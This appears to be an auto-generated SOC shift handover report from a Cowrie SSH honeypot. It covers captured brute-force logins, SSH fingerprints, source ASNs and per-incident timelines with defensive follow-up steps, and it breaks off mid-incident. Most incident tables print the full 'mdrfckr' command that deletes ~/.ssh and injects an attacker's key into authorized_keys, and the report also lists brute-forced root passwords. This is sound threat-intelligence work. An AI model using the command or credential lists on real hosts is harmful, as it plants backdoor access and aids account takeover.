# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-06 |
| **Generated At** | 2026-06-06T23:08:25Z |
| **Shift Time** | 23:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **79** |
| Confirmed Threats | **73** |
| False Positives Filtered | **6** (7.6%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **10** |
| High Severity Cases | **26** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **65** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **27** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 26 |
| `345gs5662d34` | 12 |
| `staging` | 2 |
| `jc` | 2 |
| `devuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 13 |
| `345gs5662d34` | 12 |
| `123456` | 4 |
| `staging123` | 2 |
| `jc` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 13 |
| `345gs5662d34` | `345gs5662d34` | 12 |
| `staging` | `staging123` | 2 |
| `jc` | `jc` | 2 |
| `root` | `centos2024` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789Qq` | `104.199.176.250` | 2026-06-06T21:28:44 |
| `root` | `3245gs5662d34` | `104.199.176.250` | 2026-06-06T21:28:48 |
| `root` | `ZAQ!2wsx` | `43.167.10.243` | 2026-06-06T21:34:50 |
| `root` | `3245gs5662d34` | `43.167.10.243` | 2026-06-06T21:34:54 |
| `root` | `1234QWER!@#$` | `43.167.10.243` | 2026-06-06T21:41:04 |
| `root` | `centos2024` | `14.103.112.104` | 2026-06-06T21:42:42 |
| `root` | `3245gs5662d34` | `14.103.112.104` | 2026-06-06T21:42:53 |
| `root` | `qwerty555` | `43.167.10.243` | 2026-06-06T22:04:08 |
| `root` | `hacker` | `43.167.10.243` | 2026-06-06T22:06:08 |
| `root` | `root@admin123` | `43.167.10.243` | 2026-06-06T22:08:13 |
| `root` | `A123456789!` | `43.167.10.243` | 2026-06-06T22:14:13 |
| `root` | `123Admin` | `43.167.10.243` | 2026-06-06T22:16:07 |
| `root` | `admin123123` | `36.64.131.68` | 2026-06-06T22:17:01 |
| `root` | `3245gs5662d34` | `36.64.131.68` | 2026-06-06T22:17:04 |
| `root` | `Jk147258` | `43.167.10.243` | 2026-06-06T22:19:59 |
| `root` | `centos2024` | `43.167.10.243` | 2026-06-06T22:29:46 |
| `root` | `AAbbcc123` | `36.64.131.68` | 2026-06-06T22:30:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **79** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 69 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 62 | 6 |
| `03a80b21afa8...` | Modern SSH client | 7 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 62 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 2 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.112.104`, `36.64.131.68`, `104.199.176.250`, `43.167.10.243`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **14** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS202425` | IP Volume inc | 1 | HIGH |
| `AS136336` | Thamizhaga Internet Communications Private Limited | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS137120` | Nas Internet Services Private Limited | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (26)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b77bf7d5fe14

| Field | Detail |
|---|---|
| **Source IP** | `104.199.176[.]250` |
| **First Seen** | 2026-06-06 21:28 |
| **Last Seen** | 2026-06-06 21:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:28:44` | `cowrie.session.connect` |
| `2026-06-06 21:28:44` | `cowrie.client.version` |
| `2026-06-06 21:28:44` | `cowrie.client.kex` |
| `2026-06-06 21:28:44` | `cowrie.login.success` |
| `2026-06-06 21:28:45` | `cowrie.session.params` |
| `2026-06-06 21:28:45` | `cowrie.command.input` |
| `2026-06-06 21:28:45` | `cowrie.command.failed` |
| `2026-06-06 21:28:45` | `cowrie.log.closed` |
| `2026-06-06 21:28:45` | `cowrie.session.params` |
| `2026-06-06 21:28:45` | `cowrie.command.input` |
| `2026-06-06 21:28:45` | `cowrie.session.file_download` |
| `2026-06-06 21:28:45` | `cowrie.log.closed` |
| `2026-06-06 21:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.176[.]250` to AbuseIPDB if not already reported
- [ ] Block `104.199.176[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17016ec1c200

| Field | Detail |
|---|---|
| **Source IP** | `104.199.176[.]250` |
| **First Seen** | 2026-06-06 21:28 |
| **Last Seen** | 2026-06-06 21:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:28:47` | `cowrie.session.connect` |
| `2026-06-06 21:28:47` | `cowrie.client.version` |
| `2026-06-06 21:28:48` | `cowrie.client.kex` |
| `2026-06-06 21:28:48` | `cowrie.login.success` |
| `2026-06-06 21:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.176[.]250` to AbuseIPDB if not already reported
- [ ] Block `104.199.176[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a2cb0b2e2dd

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 21:34 |
| **Last Seen** | 2026-06-06 21:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:34:50` | `cowrie.session.connect` |
| `2026-06-06 21:34:50` | `cowrie.client.version` |
| `2026-06-06 21:34:50` | `cowrie.client.kex` |
| `2026-06-06 21:34:50` | `cowrie.login.success` |
| `2026-06-06 21:34:51` | `cowrie.session.params` |
| `2026-06-06 21:34:51` | `cowrie.command.input` |
| `2026-06-06 21:34:51` | `cowrie.command.failed` |
| `2026-06-06 21:34:51` | `cowrie.log.closed` |
| `2026-06-06 21:34:51` | `cowrie.session.params` |
| `2026-06-06 21:34:51` | `cowrie.command.input` |
| `2026-06-06 21:34:51` | `cowrie.session.file_download` |
| `2026-06-06 21:34:51` | `cowrie.log.closed` |
| `2026-06-06 21:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d2441e4a08

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 21:34 |
| **Last Seen** | 2026-06-06 21:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:34:53` | `cowrie.session.connect` |
| `2026-06-06 21:34:53` | `cowrie.client.version` |
| `2026-06-06 21:34:53` | `cowrie.client.kex` |
| `2026-06-06 21:34:54` | `cowrie.login.success` |
| `2026-06-06 21:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c78fda5b4a4

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 21:41 |
| **Last Seen** | 2026-06-06 21:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:41:03` | `cowrie.session.connect` |
| `2026-06-06 21:41:03` | `cowrie.client.version` |
| `2026-06-06 21:41:03` | `cowrie.client.kex` |
| `2026-06-06 21:41:04` | `cowrie.login.success` |
| `2026-06-06 21:41:04` | `cowrie.session.params` |
| `2026-06-06 21:41:04` | `cowrie.command.input` |
| `2026-06-06 21:41:04` | `cowrie.command.failed` |
| `2026-06-06 21:41:04` | `cowrie.log.closed` |
| `2026-06-06 21:41:05` | `cowrie.session.params` |
| `2026-06-06 21:41:05` | `cowrie.command.input` |
| `2026-06-06 21:41:05` | `cowrie.session.file_download` |
| `2026-06-06 21:41:05` | `cowrie.log.closed` |
| `2026-06-06 21:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c1d68e671cf

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 21:41 |
| **Last Seen** | 2026-06-06 21:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:41:07` | `cowrie.session.connect` |
| `2026-06-06 21:41:07` | `cowrie.client.version` |
| `2026-06-06 21:41:07` | `cowrie.client.kex` |
| `2026-06-06 21:41:07` | `cowrie.login.success` |
| `2026-06-06 21:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cdbff82efb4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]104` |
| **First Seen** | 2026-06-06 21:42 |
| **Last Seen** | 2026-06-06 21:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:42:40` | `cowrie.session.connect` |
| `2026-06-06 21:42:40` | `cowrie.client.version` |
| `2026-06-06 21:42:40` | `cowrie.client.kex` |
| `2026-06-06 21:42:42` | `cowrie.login.success` |
| `2026-06-06 21:42:43` | `cowrie.session.params` |
| `2026-06-06 21:42:43` | `cowrie.command.input` |
| `2026-06-06 21:42:43` | `cowrie.command.failed` |
| `2026-06-06 21:42:43` | `cowrie.log.closed` |
| `2026-06-06 21:42:43` | `cowrie.session.params` |
| `2026-06-06 21:42:43` | `cowrie.command.input` |
| `2026-06-06 21:42:44` | `cowrie.session.file_download` |
| `2026-06-06 21:42:44` | `cowrie.log.closed` |
| `2026-06-06 21:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb1649bcaa2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]104` |
| **First Seen** | 2026-06-06 21:42 |
| **Last Seen** | 2026-06-06 21:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 21:42:52` | `cowrie.session.connect` |
| `2026-06-06 21:42:52` | `cowrie.client.version` |
| `2026-06-06 21:42:52` | `cowrie.client.kex` |
| `2026-06-06 21:42:53` | `cowrie.login.success` |
| `2026-06-06 21:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b32cb1041b

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:04 |
| **Last Seen** | 2026-06-06 22:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:04:07` | `cowrie.session.connect` |
| `2026-06-06 22:04:07` | `cowrie.client.version` |
| `2026-06-06 22:04:07` | `cowrie.client.kex` |
| `2026-06-06 22:04:08` | `cowrie.login.success` |
| `2026-06-06 22:04:08` | `cowrie.session.params` |
| `2026-06-06 22:04:08` | `cowrie.command.input` |
| `2026-06-06 22:04:08` | `cowrie.command.failed` |
| `2026-06-06 22:04:08` | `cowrie.log.closed` |
| `2026-06-06 22:04:08` | `cowrie.session.params` |
| `2026-06-06 22:04:08` | `cowrie.command.input` |
| `2026-06-06 22:04:08` | `cowrie.session.file_download` |
| `2026-06-06 22:04:08` | `cowrie.log.closed` |
| `2026-06-06 22:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-270196050533

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:04 |
| **Last Seen** | 2026-06-06 22:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:04:10` | `cowrie.session.connect` |
| `2026-06-06 22:04:10` | `cowrie.client.version` |
| `2026-06-06 22:04:11` | `cowrie.client.kex` |
| `2026-06-06 22:04:11` | `cowrie.login.success` |
| `2026-06-06 22:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8222e2244d8b

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:06 |
| **Last Seen** | 2026-06-06 22:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:06:08` | `cowrie.session.connect` |
| `2026-06-06 22:06:08` | `cowrie.client.version` |
| `2026-06-06 22:06:08` | `cowrie.client.kex` |
| `2026-06-06 22:06:08` | `cowrie.login.success` |
| `2026-06-06 22:06:09` | `cowrie.session.params` |
| `2026-06-06 22:06:09` | `cowrie.command.input` |
| `2026-06-06 22:06:09` | `cowrie.command.failed` |
| `2026-06-06 22:06:09` | `cowrie.log.closed` |
| `2026-06-06 22:06:09` | `cowrie.session.params` |
| `2026-06-06 22:06:09` | `cowrie.command.input` |
| `2026-06-06 22:06:09` | `cowrie.session.file_download` |
| `2026-06-06 22:06:09` | `cowrie.log.closed` |
| `2026-06-06 22:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5873efa4229c

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:06 |
| **Last Seen** | 2026-06-06 22:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:06:11` | `cowrie.session.connect` |
| `2026-06-06 22:06:11` | `cowrie.client.version` |
| `2026-06-06 22:06:11` | `cowrie.client.kex` |
| `2026-06-06 22:06:12` | `cowrie.login.success` |
| `2026-06-06 22:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60a9f76db4c4

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:08 |
| **Last Seen** | 2026-06-06 22:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:08:12` | `cowrie.session.connect` |
| `2026-06-06 22:08:12` | `cowrie.client.version` |
| `2026-06-06 22:08:13` | `cowrie.client.kex` |
| `2026-06-06 22:08:13` | `cowrie.login.success` |
| `2026-06-06 22:08:13` | `cowrie.session.params` |
| `2026-06-06 22:08:13` | `cowrie.command.input` |
| `2026-06-06 22:08:13` | `cowrie.command.failed` |
| `2026-06-06 22:08:14` | `cowrie.log.closed` |
| `2026-06-06 22:08:14` | `cowrie.session.params` |
| `2026-06-06 22:08:14` | `cowrie.command.input` |
| `2026-06-06 22:08:14` | `cowrie.session.file_download` |
| `2026-06-06 22:08:14` | `cowrie.log.closed` |
